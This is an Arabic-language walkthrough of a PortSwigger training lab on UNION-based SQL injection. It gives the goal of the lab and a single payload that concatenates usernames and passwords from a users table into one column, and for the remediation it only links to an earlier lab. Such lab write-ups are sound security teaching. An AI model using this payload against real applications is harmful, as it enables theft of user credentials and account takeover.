# [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

## **`الهدف`**
قم بتنفيذ هجوم `UNION SQLi` يقوم بإسترجاع/عرض كل أسماء المستخدمين وكلمات المرور ثم قم بتسجيل الدخول بحساب `administrator`.
## **`خطوات الحل`**
سنقوم بتكرار نفس خطوات حل [اللاب السابق](./SQL-injection-UNION-attack,-retrieving-data-from-other-tables.md) ولكن سنقوم بتغيير الـ `Parameter` إلي
```sql
' UNION SELECT NULL,username || '~' || password FROM users--
```

لنتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)
